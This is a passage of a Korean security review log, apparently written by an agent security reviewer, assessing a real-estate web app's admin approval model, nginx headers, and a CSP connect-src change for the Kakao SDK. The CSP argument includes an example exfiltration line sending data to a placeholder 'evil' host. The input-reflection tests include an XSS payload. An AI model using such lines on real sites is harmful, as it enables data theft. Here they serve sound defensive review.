### 2) 권한 모델 — **상승 경로가 구조적으로 없다**

#### 2-A. 토큰에 권한이 없다 (실측)

발급된 access 토큰을 디코드한 클레임: **`exp, iat, jti, sub, typ` 정확히 5개.**
`is_admin`·`admin`·`role`·`roles`·`scope`·`status`·`perms` **0건**.
→ 관리자 여부는 매 요청 DB에서 `is_admin AND status='approved'` 로 판정된다.
**권한 회수가 즉시 반영**되고(토큰 재발급 대기 없음), 토큰 위조로 권한을 얻을 수도 없다.

#### 2-B. 404 관문 — 7/7 전부 404 (실측)

| 요청 | 응답 |
|---|---|
| 관리자 `GET /admin/users` | `200` |
| 비관리자 `GET /admin/users` | **404** `{"detail":"Not Found"}` |
| 비인증 `GET /admin/users` | **404** (401 아님) |
| 잘못된 토큰 | **404** |
| 비관리자 `POST /admin/users` (405 대상) | **404** |
| 비관리자 `POST /admin/users/abc/status` (422 대상) | **404** |
| **관리자** `POST /admin/users/abc/status` (422 대상) | **404** |

`@router.api_route("/admin/{rest:path}")` 포괄 라우트가 정상 라우트 **뒤에** 놓여 405·422까지 전부
404로 맞춘다. Starlette이 완전 일치를 먼저 찾으므로 정상 라우트를 가리지도 않는다.

**이 선택이 옳은가 — 옳다.** 405는 그 자체로 "여기 라우트가 있다"는 신호이고, 401은 "인증하면 뭔가
있다"는 신호다. 둘 다 관리 기능의 존재를 알려준다. 비용은 **관리자 본인의 오타도 404로 보인다**는 것
(422 대신 404라 디버깅이 불친절)인데, 관리자가 1명인 운영 환경에서 감수할 만하다.

#### 2-C. 마지막 관리자 보호 — 리포지토리에서 막는다 (실측)

```
활성 관리자 2명 → 1명 reject           : 200 (허용)
활성 관리자 1명 → 마지막 reject 시도    : 409 {"code":"LAST_ADMIN"}
리포지토리 직접 호출(라우터 우회)        : LastAdminError 발생 — 차단
```
라우터가 아니라 **API·CLI 공통 길목**에 두어 우회가 불가능하다. 그리고 이 409는 404로 덮지 않는데,
**숨길 정보가 아니라 왜 안 되는지 알려줘야 하는 상황**이라 옳은 예외다.

#### 2-D. 웹에 권한 부여 경로가 **없다**

라우트 전수 확인 결과 `grant-admin` 계열 엔드포인트가 **존재하지 않는다.** 관리자 부여는
`scripts/manage_users.py --grant-admin` 뿐이고 그건 **SSH가 있어야** 실행된다.
"첫 가입자 자동 관리자"를 일부러 안 만든 판단도 옳다 — 사이트가 이미 공개돼 있어 선점 가능했다.
마이그레이션에 특정 이메일을 박지 않은 것도 마찬가지다(개인 계정이 저장소에 남는다).

#### 2-E. refresh — 7일 창이 실제로 닫힌다 (실측, https 클라이언트로 쿠키 왕복)

| 시나리오 | 결과 |
|---|---|
| 승인 상태 refresh | `200` |
| **rejected 로 바꾼 뒤** refresh | `401` + 쿠키 삭제 |
| **pending 으로 바꾼 뒤** refresh | `401` + 쿠키 삭제 |

삭제 헤더: `refresh_token=""; Max-Age=0; HttpOnly; Path=/api/v1/auth; SameSite=Strict; Secure`
— 발급 때와 **속성이 일치**해서 실제로 지워진다(속성이 다르면 브라우저가 안 지운다).
승인 취소가 최대 7일간 무력화되던 창이 닫혔다. 미승인자의 일반 API 접근도 `403 PENDING_APPROVAL`.

#### 2-F. 관리자 응답에 민감정보가 없다 (실측)

`GET /admin/users` 응답 키: **`id · email · status · is_admin · created_at · status_changed_at ·
status_changed_by · status_reason`** — 8개뿐.
`password_hash`·`argon2`·`cash_krw`·`income_krw`·`existing_loan` 등 검색 → **0건**.
`AdminUserOut` 이 마지막 문 역할을 실제로 하고 있다.

#### 2-G. CLI

`scripts/manage_users.py` 는 **비밀번호를 전혀 다루지 않는다**(승인은 접근 권한이지 자격증명이 아니라는
설계와 일치). `from _common import ...` 를 거치므로 로깅 억제·비밀 마스킹이 자동으로 걸린다(SR17-3 구조).

---

### 3) REC-3 — 제외 사유 평문 저장의 SR4-2 회귀

#### 3-A. 그물 실측 — 7/7 탐지 · 오탐 0/2

`_strip_asset_amounts` 에 자산 원본(현금 8억·소득 1.2억·대출 5천)을 **일곱 가지 표기**로 밀어 넣었다:

| 넣은 형태 | 가려졌나 |
|---|:--:|
| 숫자 그대로 `800000000` | ✅ |
| 콤마 `800,000,000` | ✅ |
| 억 표기 `8억원` | ✅ |
| 만원 표기 `80000만원` | ✅ |
| 억+만원 혼합 `1억2000만원` | ✅ |
| **한글 수사 `팔억원`** | ✅ |
| 기존대출 원본 | ✅ |
| *(정상)* 시세 `1,300,000,000원` | 통과 — 오차단 없음 |
| *(정상)* 한도 파생값 `1,050,000,000원` | 통과 — 오차단 없음 |

값 비교(`extract_amounts`) 방식이라 시세 13억을 자산 3억으로 오인해 가리는 일이 없다.
걸리면 사유 **문장만** 안전한 문구로 바꾸고 `reason_code`·단지명은 남겨 사용자가 답을 잃지 않는다.

#### 3-B. 1차 방어(구조)도 실재한다

`AnalysisContext` 에 자산 원본이 없고, 사유를 만드는 `orchestrator` 는 원본을 아예 갖고 있지 않다.
`excluded_record` 가 **고정 키 집합**만 만든다(`complex_id · complex_name · area_m2 · price_basis ·
price_estimated · reason_code · reason`). 자유 문자열은 `reason` 과 DB에서 온 `complex_name` 뿐이다.

#### 3-C. IDOR — 유지 (코드 확인)

```sql
-- 저장
UPDATE recommendation_job SET status=:status, result_meta=CAST(:meta AS jsonb)
 WHERE id = :job_id AND user_id = :user_id RETURNING id      -- 없으면 쓰지 않는다
-- 조회
SELECT id, user_id, criteria_snapshot, status, result_meta
  FROM recommendation_job WHERE id = :job_id AND user_id = :user_id
```
둘 다 `user_id` 조건 유지 + 전부 바인드 파라미터. items 조회는 job 소유권 확인 **이후**라 안전.

#### 3-D. 운영 DB 실측 — 평문 금액 컬럼 0

`user_profile` 컬럼: `cash_krw_enc:bytea | existing_loan_krw_enc:bytea | income_krw_enc:bytea |
household_size:smallint | owned_houses:smallint | updated_at | user_id` — **금액은 전부 bytea 암호문.**
`recommendation_job` 은 현재 0행이라 실저장물 스캔은 대상이 없었다(담당자의 실행 스캔 결과를 대체하지 않는다).

#### 3-E. 잔여 (SR20-3, low) — 그물의 사정거리가 문서보다 좁다

1. **`reason` 한 필드만 본다.** 같은 dict의 다른 키에 금액을 넣으면 그대로 통과한다(실측: `complex_name`·
   `note`·`detail`·`message` **4/4 유출**). 현재 `excluded_record` 가 고정 키만 만들어 실제 경로는 없지만,
   함수 docstring은 "제외 사유에 자산이 섞였는지" 전반을 막는 것처럼 읽힌다.
2. **`notes` 는 그물을 아예 통과하지 않는다** — `recommend.py:153-154` 가 `excluded` 만 필터링하고
   `notes` 는 그대로 합쳐 같은 평문 컬럼에 넣는다. 현재 notes는 **전부 정적 문자열·상수**
   (`CANDIDATE_COMPLEX_LIMIT`·`MAX_CANDIDATES`)라 안전하나, 검사받지 않는 경로가 하나 열려 있다.
3. **`forbidden` 이 비면 조용히 no-op** 이다(`guarded` 가 비면 원본 그대로 반환).
   같은 상황에서 `portfolio_summary` 는 **fail-loud** 로 막는데 여기는 아니다 — 비대칭이다.
   프로필이 없으면 excluded도 비므로 현재 무해.

→ 권고: `notes` 도 같은 그물에 태우고, 검사 대상 필드를 화이트리스트로 명시하고, `guarded` 가 비었는데
excluded가 있으면 fail-loud. 셋 다 작은 수정이다.

---

### 4) ★ 배포 선결 조건 — **운영 DB에 009가 적용돼 있지 않다** (SR20-1)

**취약점이 아니다. 그러나 이 순서를 어기면 서비스가 전면 장애가 난다.**

운영 DB 실측(조회 전용):

```
app_user 실제 컬럼 : id, email, password_hash, created_at
  status 컬럼       : 없음 (0)
  user_status_event : 없음 (0)
recommendation_job.result_meta : 있음  ← 010 은 적용됨
```

신규 코드의 `_USER_COLUMNS` 는 `status, is_admin, status_changed_at, status_changed_by, status_reason`
를 SELECT한다. 009 없이 코드를 올리면 `get_user_by_email`(로그인)·`get_user_by_id`(토큰 검증)가
**전부 실패 → 로그인·인증 전 경로 500.** 마이그레이션 파일 자신이 이 순서를 경고하고 있고,
그 경고가 실제 상황과 일치함을 확인했다.

방향은 **fail-closed**(무단 접근이 열리는 게 아니라 전부 막힘)라 보안 위험은 아니다. 다만:

1. **반드시 `009 → 코드` 순서.**
2. 009 적용 즉시 기존 계정이 전부 `pending` 이 된다 — 운영 DB의 **실사용자 1명(id=11,
   2026-07-26 가입)** 이 로그인 불가 상태가 된다. 이건 의도된 동작이다(차단 이전에 선점된 계정을
   자동 통과시키지 않는다). 복구는 PM이 CLI로:
   `manage_users.py --list` → `--approve <email>` → `--grant-admin <email>`.
3. **관리자를 지정하기 전까지는 아무도 승인할 수 없다** — CLI가 유일한 부트스트랩 경로다.
   이 순서를 배포 절차에 못박아 둘 것.

> ⚠️ 감사자는 **조회만** 했다. 실사용자 계정·상태를 건드리지 않았고 009도 적용하지 않았다.

---

### 5) 라이브 서버 상태 — 대체로 좋고, 임시 조치 1건이 DEP-1을 재현했다

#### 5-A. 좋은 것 (실측)

| 항목 | 결과 |
|---|:--|
| CSP | **강제**(Report-Only 0 · 강제 3). `/` 응답에 보안헤더 **5/5** — SR15-4 라이브 확인 |
| DB 포트 | 5432 리스너 **0**, `realestate-db` Ports 공란 |
| 임시 가입 차단 | `POST /auth/register` → **403** 동작 확인 |
| 로그인 | 없는 계정 → **401** (구 코드지만 정상) |
| 자산 암호화 | `user_profile` 금액 3종 전부 `bytea` |
| 동거 서비스 | `itsmine-*`·`autobtc` **조회만** — 변경 0회 |

#### 5-B. ★ SR20-2 (low) — TEMP-REG-BLOCK이 보안헤더 상속을 끊었다

운영 nginx(`/etc/nginx/sites-available/realestate.utilverse.info:171-177`):

```nginx
# === TEMP-REG-BLOCK (2026-07-26) ===
location = /api/v1/auth/register {
    return 403 '{"error":{"code":"REGISTRATION_CLOSED", ...}}';
    add_header Content-Type application/json always;    # ← 이 한 줄이 상속을 끊는다
}
```

`add_header` 가 하나라도 있으면 상위 레벨 `add_header` 를 **전혀 상속하지 않는다** — 이 프로젝트가
DEP-1로 이미 겪고, `test_deploy_config.py` 까지 만들어 막던 바로 그 규칙이다. 라이브 실측:

```
/api/v1/auth/register -> 보안헤더 0/5      ← CSP·HSTS·X-Frame-Options·nosniff·Referrer-Policy 전무
/api/v1/auth/login    -> 보안헤더 9/5(중복 포함)
/                     -> 보안헤더 5/5
```

덤으로 `content-type: application/octet-stream` 과 `application/json` 이 **둘 다** 실려 있고
`nosniff` 가 없다.

**영향은 낮다** — 고정 문자열 JSON이고 공격자 입력이 섞이지 않아 XSS 경로가 없다.
**중요한 건 다른 데 있다**: 저장소의 정적 게이트(`test_deploy_config.py`)는 **서버에서 손으로 넣은
블록을 볼 수 없다.** 막아 놓은 결함 유형이 우회 경로로 되살아났다.

**해소는 이번 배포 그 자체다.** 이 블록을 제거하면 register가 정규 라우트
(`location ~ ^/api/v1/auth/(login|register)$`)로 넘어가 **보안헤더도 rate limit(re_auth 1r/s·burst 5)도
정상 적용**된다. 다만 제거를 잊으면 승인제가 무의미해지므로(가입 자체가 403) 절차에 못박을 것.
※ nginx 위치 우선순위상 정확일치(`=`)가 정규식보다 앞서므로, **지금은 register가 rate limit도 안 받는다**
(403이라 무해).

---

### 6) 프론트 관리자 화면 (ADM-2) — 클라이언트가 권한을 주장할 수 없다

- **판정은 서버에만 있다**: `availability` 가 `probing → (200) available / (404) unavailable`.
  **200을 실제로 받은 경우에만** 진입점을 켠다. "일단 메뉴를 띄우고 눌렀을 때 404"를 하지 않는다.
- **모르면 숨긴다**: 네트워크 오류 등 404가 아닌 실패에서는
  `setAvailability(prev => prev === "available" ? prev : "unavailable")` — 확인된 적 없으면 계속 숨김.
  **fail-closed** 다.
- **404를 "권한 없음"으로 표시하지 않는다** — 서버가 숨긴 것을 화면이 도로 알려주지 않는다.
- **정제 함수가 문(門)이다**: `sanitizeAdminUser` 가 **허용 목록** 방식이라 매핑하지 않은 키는 전부 버려진다.
  `SENSITIVE_KEYS`(자산 3종·`password_hash`·토큰 등)가 응답에 오면 `droppedSensitive` 로 화면에 알려
  **백엔드 회귀가 조용히 지나가지 않는다.** 타당한 설계다 — 프론트가 백엔드의 마지막 회귀 탐지기가 된다.

---

### 7) 수집(INGEST-3 · GEO-8) · JOB-1

- **SQL 안전성**: 저장소 전체 f-string SQL은 전부 `_USER_COLUMNS`(모듈 상수 컬럼 목록) 또는
  `backup.complex_geom_pre_geo1`(리터럴) 삽입뿐. **사용자 입력이 들어가는 자리 0건.**
  신규 `loader.py`·`geocode.py` 변경분에 문자열 조합 SQL 없음.
- **G4 유지**: 신규 외부 호출 없음. rate limit·공공 API 전용 구조 무변경.
- **JOB-1**: 실패 상태값을 DB CHECK(`queued|running|done|failed`)와 맞춘 수정. 보안 결함은 아니지만
  **관점상 중요하다** — 고칠 만했다. 실패가 `queued` 로 남으면 화면에는 "분석 중…"이 무한히 떠서
  **사고가 진행 중인 작업으로 위장**된다. 운영자가 "실패 0건"을 보고 안심하는 상태가 가장 위험하다.
  이 프로젝트가 반복해서 지켜 온 원칙("조용한 실패 금지")과 같은 선상이며, 상태값을 상수로 묶고
  DB 제약과 일치하는지 테스트로 고정한 방식도 적절하다.

---

### 8) DEC-001 / 카카오 JS 키 — **SR19-1 상태 그대로** (재확인 필요)

사용자가 `https://realestate.utilverse.info` 를 등록했다고 했으나, **세 번째 측정에서도 결과가 같다**
(12:44 · 12:51 · 15:46, 전부 동일):

```
referer 없음                              -> HTTP 200   (감사자 PC 에서 SDK 정상 수신)
referer https://realestate.utilverse.info -> HTTP 401   domain mismatched
referer https://realestate.utilverse.info/ -> HTTP 401
```

→ **등록이 반영되지 않았거나 다른 앱에 등록됐다.** 콘솔에서 앱 선택과 도메인 문자열을 재확인해야 한다.
지도가 지금 뜨는 이유는 여전히 우리 nginx의 `Referrer-Policy: no-referrer` 덕분이며,
그 결합이 문서화되지 않으면 나중에 Referrer-Policy를 "개선"하는 순간 지도가 죽는다.
**배포 차단 사유는 아니다**(피해 상한이 DEC-001이 이미 수용한 "한도 소진"과 동일).

---

### 신규 발견 요약

| ID | 심각도 | 제목 | 차단 |
|---|:--:|---|:--:|
| `SR20-1` | — (선결조건) | 운영 DB에 **009 미적용** — 코드를 먼저 올리면 로그인·토큰검증 전면 500(fail-closed). 적용 후 실사용자 승인·관리자 지정이 CLI로 필요 | **배포 순서 필수** |
| `SR20-2` | low | 서버 TEMP-REG-BLOCK의 `add_header` 가 보안헤더 상속을 끊어 `/auth/register` 가 **0/5** (DEP-1 재현). 배포 시 블록 제거로 해소 | 비차단 |
| `SR20-3` | low | `_strip_asset_amounts` 가 `reason` 한 필드만 검사 · **`notes` 는 미검사** · `forbidden` 이 비면 조용히 no-op(포트폴리오 경로는 fail-loud인데 비대칭) | 비차단 |
| `SR20-4` | low | `register` 409 `EMAIL_TAKEN` 가입 여부 오라클 잔존 — **수용 가능**(로그인 오라클 폐쇄 · 승인 없이 무용 · 1r/s 제한 · 메일 인프라 부재) | 비차단 |
| `SR19-1` | medium(유지) | 카카오 JS 키 도메인 제한 미작동 — 3회 측정 동일. 콘솔 재확인 필요 | 비차단 |

### CLOSE 처리

`SR10-1` **RESOLVED** — 계정 열거 타이밍 오라클. 응답 동일성 + 타이밍 실측(argon2 비용의 2.2%)으로 확인.
승인제라는 새 기능을 붙이면서 **원래 있던 취약점까지 닫은** 사례다.

### 판정

**PASS — 배포를 막을 보안 사유 없음. `deploy_approved: true`**

이번 변경은 공격 표면을 넓히지 않고 **좁혔다**. 새 인증 경로(승인제)를 추가하면서
① 계정 열거를 측정 가능한 수준으로 닫았고 ② 토큰에 권한을 싣지 않아 위조·회수지연 문제를 없앴고
③ 웹에 권한 부여 경로를 아예 두지 않았고 ④ 마지막 관리자 보호를 라우터가 아닌 공통 길목에 두었다.
평문 컬럼(REC-3)을 새로 만들면서 값 비교 그물을 함께 놓은 것도 옳다(7/7 탐지·오탐 0).

**배포 순서(반드시)**
1. `009_user_approval.sql` 적용 → 2. 코드 배포 → 3. CLI로 실사용자 승인 + 관리자 지정 →
4. nginx **TEMP-REG-BLOCK 제거** + `nginx -t` → reload → 5. `/auth/register` 보안헤더 5/5 재확인.

**사용자에게 올릴 것**: SR19-1(카카오 JS 키 도메인 등록이 3회 측정 모두 미반영 — 콘솔 재확인).

---

## SR-021 · 2026-07-26 · **가중치 반영(WEIGHT-1) · UI/UX 재설계(UX-1) · ★CSP `connect-src` 판정** (security-reviewer, herdr re-review 대행)

**판정: PASS** — 배포를 막을 보안 사유 없음.
**CSP 판정: `connect-src` 에 `https://dapi.kakao.com` 을 추가한다(ADD).** 근거는 §1.
대상: SR-020 이후 미커밋 변경 — `app/agents/scoring.py`(신규) · `orchestrator.py` · `recommend.py` · 프론트 대량(신규 20여 파일)
재현: backend **756 tests / 0 failures / 63 skipped = 693 passed** · frontend **27 files / 358 passed** — 지시 수치 일치

---

### 1) ★ CSP `connect-src` 판정 — **추가한다**

#### 1-A. 먼저 사실관계부터 — 추측이 아니라 **SDK 원본을 읽었다**

담당자가 "실브라우저 검증 전"이라고 한 지점(XHR인가 JSONP인가)을 **코드로 확정**했다.
`https://t1.daumcdn.net/mapjsapi/js/libs/services/1.1.1/services.js` (6,349 B) 를 내려받아 분석:

```
XMLHttpRequest      : 1        callback            : 0
onreadystatechange  : 1        jsonp / JSONP       : 0
responseText        : 2        createElement(script): 0
참조 호스트          : dapi.kakao.com  (유일)
```

실제 전송부:

```js
var Ajax = !IE_VERSION || 9 < IE_VERSION
  ? function(b){
      var a = new XMLHttpRequest;
      a.open("GET", b.url + "?" + Util.serialize(b.params), !0);
      a.setRequestHeader("KA", KA_HEADER_STRING);
      a.setRequestHeader("Authorization", AUTH_HEADER_STRING);   // "KakaoAK " + APP_KEY
      ...
    }
  : function(b){ var a = new XDomainRequest; ... }               // IE9 이하
var DOMAIN = PROTOCOL + "//dapi.kakao.com",
    URL = { GEO: DOMAIN+"/v2/local/geo/", SEARCH: DOMAIN+"/v2/local/search/" };
```

**JSONP가 아니다. 순수 XHR이다.** 따라서 현재 `connect-src 'self'` 에서 **반드시 막힌다.**
게다가 `Authorization`·`KA` 라는 **커스텀 헤더**를 붙이므로 요청이 non-simple 이 되어
**CORS preflight(OPTIONS)** 가 먼저 나가는데, `connect-src` 는 preflight도 똑같이 통제한다.
즉 우회로가 없다 — 추가하지 않으면 이 기능은 **100% 동작하지 않는다.**

#### 1-B. 판정: **ADD** — 이유를 정직하게 적는다

내가 SR-019에서 "connect-src 를 넓히면 반출 경로가 하나 는다"고 쓴 것은 사실이고, 지금도 유효하다.
그런데 그 문장을 이 사안에 적용하면 결론은 **추가하는 쪽**이다. 세 가지 때문이다.

**① 이미 더 센 권한을 준 상대다.**
`https://dapi.kakao.com` 은 **이미 `script-src` 에 있다.** 그 출처의 스크립트는 우리 오리진에서
**임의 코드를 실행**할 수 있다 — DOM을 읽고, 쿠키를 실은 채 우리 API를 부르고, 원하는 대로 반출할 수 있다.
그에 비하면 "그 호스트로 XHR을 **보낼** 수 있다"는 **엄격히 약한 권한**이다.
코드 실행을 허용해 둔 상대에게 데이터 전송을 막는 것은 방어가 아니라 **모양새**다.

**② 이 CSP는 애초에 반출을 막는 물건이 아니다(내가 SR-019에서 실증했다).**
`navigate-to` 지시어는 표준에서 빠져 브라우저에 없고, WebRTC는 CSP에 지시어 자체가 없다.
따라서 XSS가 성립하면 `location.href='https://evil/?d='+data` 로 **이미 전부 나간다.**
`connect-src` 한 줄을 조여 봐야 "데이터가 나갈 수 있는가"의 답은 **이미 예**다.
이번 추가의 실제 델타는 "공격자가 제어하지 못하는 제3자에게 향하는, 되읽을 수 없는 단방향 채널 1개"뿐이다.
반면 **CSP의 진짜 기여(주입 코드의 실행 차단 = `script-src` 에 `'unsafe-inline'`·`'unsafe-eval'` 없음)는
전혀 손상되지 않는다.**

**③ 대안이 더 나쁘다.**
서버 프록시를 두면 REST 키를 쓰게 되는데, 그건 **서버 전용 비밀키**를 요청당 노출 경로에 올리는 일이고
rate limit·비용·마스킹 부담이 새로 생긴다. 기능을 포기하면 사용자가 요청한 기능이 죽는다.
지금 구조(JS SDK + 공개용 JS 앱키)가 **가장 적은 비밀을 쓰는 선택**이다.

> 반대로, 만약 `dapi.kakao.com` 이 `script-src` 에 **없었다면** 나는 반대했을 것이다.
> 새 출처를 반출 경로로만 여는 것은 대가 없이 표면만 넓히는 일이기 때문이다.
> 여기서는 그 조건이 성립하지 않는다.

#### 1-C. 정확한 값 — **`connect-src` 한 곳만 바꾼다**

```
default-src 'self'; script-src 'self' https://dapi.kakao.com https://t1.daumcdn.net; style-src 'self' 'unsafe-inline'; img-src 'self' https://t1.daumcdn.net https://mts.daumcdn.net https://s1.daumcdn.net; connect-src 'self' https://dapi.kakao.com; font-src 'self'; object-src 'none'; base-uri 'none'; form-action 'self'; frame-ancestors 'none'
```

변경분은 **`connect-src 'self'` → `connect-src 'self' https://dapi.kakao.com`** 뿐이다.
`default-src` 는 건드리지 않는다. 와일드카드·`data:`·서브도메인 와일드카드 전부 쓰지 않는다.
`t1.daumcdn.net` 은 `connect-src` 에 **넣지 않는다**(스크립트·이미지 로드일 뿐 XHR 대상이 아니다).

**반드시 함께 할 것 — 테스트가 깨진다(그게 정상이다):**
`backend/tests/test_deploy_config.py::test_기본_차단과_프레임_방어가_들어_있다` 가
`_directive("connect-src") == ["'self'"]` 를 단언하므로 **실패한다.** 값과 함께 고칠 것.
이 참에 SR19-2에서 권고한 **지시어별 정확 집합 단언**으로 바꾸면 "출처를 넓히는 변경"도 잡힌다:
```python
assert set(_directive("connect-src")) == {"'self'", "https://dapi.kakao.com"}
```

#### 1-D. ⚠️ CSP를 고쳐도 이 기능은 아직 안 될 수 있다 (SR19-1 연동)

`services.js` 는 XHR에 `Authorization: KakaoAK <JS앱키>` 를 실어 `dapi.kakao.com` 을 부른다.
그런데 **SR19-1이 아직 열려 있다** — 카카오 JS 앱키의 웹 도메인 허용목록에 우리 도메인이
등록돼 있지 않다(SR-019·SR-020에서 3회 측정, 전부 `401 domain mismatched`).
로컬 API 호출은 SDK 로더보다 도메인 검사가 엄격할 가능성이 높다.

→ **예측**: CSP를 고쳐도 장소 검색이 401로 실패할 수 있다. 그때 **CSP를 더 풀지 말 것** —
원인은 CSP가 아니라 카카오 콘솔의 도메인 등록이다. 담당자가 실패를 조용히 삼키지 않고
"장소 검색을 사용할 수 없습니다"를 노출하게 만든 설계 덕분에 이 구분이 화면에서 드러난다. 좋은 판단이다.

---

### 2) WEIGHT-1 — 자산 유출(SR4-2) 회귀 없음

#### 2-A. 구조적 격리 — `scoring.py` 는 자산을 **아예 모른다**

신규 `app/agents/scoring.py` 전수 검색: `cash`·`income`·`loan`·`forbidden`·`affordability` **0건**.
가중치와 에이전트 점수만 받는다. 자산이 이 모듈에 도달할 인자 자체가 없다 — 1차 방어는 구조다.

#### 2-B. 변이로 그물 확인 — **탐지됨**

`orchestrator.py` 의 `score_notes` 에 자산 원본을 주입:
```python
"score_notes": list(score.notes) + [f"보유현금 {ctx.affordability.usable_cash_krw:,}원 기준"],
```
→ **3건 FAIL**(`test_scoring.py` 포함). 원복 후 바이트 동일 확인 + 전체 재실행 정상.
"8/8 KILLED" 주장은 내가 독립적으로 넣은 변이에서도 재현된다.

#### 2-C. confidence 를 곱하지 않는 판단 — **타당하다**

보안 사안은 아니지만 판정을 요구했으니 답한다. **동의한다.**
사용자가 준 30%가 내부 신뢰도로 조용히 21%가 되면, 슬라이더는 **예측 불가능한 장치**가 된다.
이 제품의 신뢰는 "왜 이 순위인가"를 설명할 수 있는 데 있는데, 사용자가 만질 수 있는 값과 실제 적용값이
말없이 달라지면 그 설명이 성립하지 않는다. 근거가 약한 축은 **곱해서 희석**하는 대신
**제외하고 재정규화 + 3중 고지**(`score_axes`·`score_notes`·전체 `notes`)한 쪽이 정직하다 —
"약하게 반영했다"보다 "반영하지 않았고 그 사실을 말한다"가 검증 가능하다.

---

### 3) 지시받은 확인 항목

#### 3-1. 역 검색 입력 — 인젝션·좌표 위조

| 항목 | 결과 |
|---|:--|
| 키워드 → SDK | `Util.serialize` 가 `encodeURIComponent(k)+"="+encodeURIComponent(v)` 로 인코딩(원본 확인) — URL 인젝션 불성립 |
| 좌표 파싱 | `coord()` 가 **빈 문자열·공백을 `Number()` 이전에 거부**하고 `Number.isFinite` 로 재확인 → `Number('')===0` 버그 해소 확인 |
| 결과 채택 | `toPlace` 가 lng·lat 둘 다 유효하고 `place_name` 이 비어 있지 않을 때만 반환 |
| 좌표 순서 | `x=경도 · y=위도` 를 `[lng, lat]` 로 유지(뒤집힘 없음) |
| 실패 처리 | `throw` 하지 않고 `unavailable`/`empty`/`failed` 상태로 화면에 노출 — 조용한 실패 없음 |

**잔여(SR21-3, info)**: `Number.isFinite` 는 통과하지만 **위경도 범위 검증은 없다.**
`x=99999` 같은 값도 유한수라 통과한다. 출처가 카카오 API라 공격자 제어가 아니고 결과는 "지도가 엉뚱한 곳을
비춘다" 정도라 info. 권고: `-180≤lng≤180`, `-90≤lat≤90` (더 좁히려면 수도권 bbox) 한 줄 추가.

#### 3-2. XSS — 신규 DOM 경로 전수

프론트 `src/**` 전수 검색: `innerHTML`·`dangerouslySetInnerHTML`·`insertAdjacentHTML`·`outerHTML`·
`eval(`·`new Function`·`document.write` **실사용 0건**(전부 "쓰지 마라"는 주석). 마커 라벨은 여전히
`row.textContent = line`. 신규 컴포넌트(`PlaceSearch`·`RegionPicker`·`FilterRail`·`InfoTip`·`MapLegend`)도
JSX 텍스트 자식으로만 렌더 → React 자동 이스케이프. **XSS 싱크 0.**

#### 3-3. 지역 목록 번들 포함 — **수용 가능**

`lib/regions.ts` 는 행정안전부 법정동코드에서 생성된 **공개 행정구역 데이터**다. 민감정보 0.
중요한 건 **한계를 숨기지 않는다**는 점 — "행정구역 기준이지 '데이터가 있는 지역' 목록이 아니다"를
주석과 `RegionPicker` 안내 문구 양쪽에 적어 두었고, 서버 엔드포인트가 생기면 이 파일만 바꾸면 되게
호출부를 분리했다. 이 프로젝트가 지켜 온 "모르는 걸 모른다고 보여준다"와 일치한다. 수용 가능하다.

#### 3-4. 인증 회귀 — 없음

`accessToken` 은 모듈 스코프 `let` **1개**(메모리 전용), `localStorage`/`sessionStorage`/`document.cookie`
**실사용 0건**(주석뿐). `X-Requested-With` 유지, 쿠키 경로는 `credentials:"include"`.

**`mapCamera` 가 저장소를 안 쓰는 판단 — 타당하다.** 지도 위치는 "내가 어느 동네에서 집을 보고 있는지"라
**그 자체로 사생활**이고, 이 앱의 저장소 금지 원칙(토큰)과 같은 선상이다. 모듈 메모리라 탭을 닫으면
사라지는 것도 맞다. 편의(재마운트 시 자리 유지)를 얻으면서 영속 흔적을 남기지 않는 절충이 적절하다.

#### 3-5. `score_notes`·`notes` 의 사용자 입력 반사 — **반사가 있다(SR21-2, low)**

지시받은 질문의 답은 **"있다"** 이다. `scoring.py:417-420` 이 사용자가 보낸 **가중치 키 이름을 그대로**
문장에 넣는다:

```python
notes.append(f"가중치 항목 {', '.join(sorted(set(unknown_keys)))} 은(는) 무시했습니다 — …")
```

직접 실행해 확인:

| 보낸 `weights` | 결과 |
|---|:--|
| `{"<script>alert(1)</script>": .5, "price": .5}` | 노트에 **태그 문자열 그대로** 반사(길이 143) |
| `{"A"×2000: .5, "price": .5}` | 노트 길이 **2,118자** |
| 키 300개 | 노트 길이 **1,806자** |

그리고 이 문자열은 ① `recommendation_job.result_meta`(**평문 jsonb**)에 저장되고 ② 화면에 렌더된다.
스키마는 `weights: dict[str, float]` 뿐 — **키 이름 길이·개수 제한이 없다.**

**그런데 XSS는 아니다**: React가 이스케이프하므로 `<script>` 는 글자로 보인다(3-2 확인).
**타인에게도 미치지 않는다**: `result_meta` 는 IDOR로 보호돼 본인만 읽는다(SR-020 확인).
**증폭도 제한적이다**: nginx `client_max_body_size 1m` 이 요청 본문을 1MB로 묶는다.

→ 결론: **low, 비차단.** 남는 것은 "검증되지 않은 사용자 입력이 평문 컬럼에 영속되고 다시 표시된다"는
위생 문제다. 권고: `weights` 키를 `WEIGHT_AXES` 로 제한하거나 **개수·길이 상한**(예: 키 20개·32자)을 두고,
반사할 때 목록을 잘라서(예: 상위 5개 + "외 N개") 넣을 것.

#### 3-6. 부수 — `region_codes` 항목 패턴 미검증 (SR21-4, info)

`region_codes: list[str] = Field(..., max_length=50)` 은 **개수만** 제한하고 항목 형식은 안 본다.
SQL은 `unnest(CAST(:region_codes AS text[]))` + `c.region_code LIKE rc || '%'` 로 **완전한 파라미터 바인딩**이라
**인젝션은 불성립**이다. 다만 `%` 를 코드로 보내면 `LIKE '%%'` 가 되어 **선택하지 않은 지역까지 후보에 들어온다.**
`complex` 는 공개 아파트 마스터라 사생활 문제는 없고 `LIMIT 50` 이 걸려 있어 info.
권고: 항목에 `pattern=r"^\d{5}$"` 한 줄.

---

### 4) 재현·회귀

| 항목 | 결과 |
|---|:--|
| backend | **756 tests / 0 failures / 0 errors / 63 skipped = 693 passed** — 지시 수치 일치 |
| frontend | **27 files / 358 passed** — 지시 수치 일치 |
| SR4-2 변이 | `score_notes` 에 자산 원본 주입 → **3건 FAIL**(탐지). 원복 바이트 동일 |
| 인증 회귀 | access 메모리 전용 · refresh 쿠키 · `X-Requested-With` · localStorage 0건 |
| IDOR | `result_meta` 저장·조회 모두 `user_id` 조건 유지(SR-020 확인분 무변경) |
| SQL | 신규 f-string SQL 0건. `region_codes` 는 배열 파라미터 바인딩 |

> ※ 측정 중 `test_scoring.py::test_음수_NaN_은_버린다` 가 1회 실패했다가 연속 2회 0 fail 로 돌아왔다.
> 내 변이는 바이트 단위로 원복됐음을 확인했고, 해당 파일은 내가 건드리지 않았다 —
> SR-019·SR-020 때와 같은 **동시 편집 중 일시 현상**으로 본다. 배포 직전 트리 동결 후 최종 그린 확인 권고.

---

### 신규 발견 요약

